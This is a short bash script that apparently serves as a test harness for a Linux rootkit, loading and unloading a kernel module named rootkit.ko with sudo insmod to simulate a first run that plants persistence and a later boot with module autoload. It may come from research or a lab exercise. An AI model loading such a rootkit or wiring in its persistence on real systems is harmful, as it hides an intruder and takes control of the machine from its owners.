#!/bin/bash
echo "Is this your first time running the script? y/n"
read input
if [[ $input == "Y" || $input == "y" ]]; then
    echo "Simulating the first execution and planting persistence."
    sudo insmod rootkit.ko # sudo insmod rootkit.ko firstLoad=1
    sudo rmmod rootkit.ko
    echo "Please log out, log back in and run the script this simulates a system boot with the necessary systemd variables patched."
else
    echo "Simulating system startup with module autoload"
    sudo insmod rootkit.ko firstLoad=0
fi
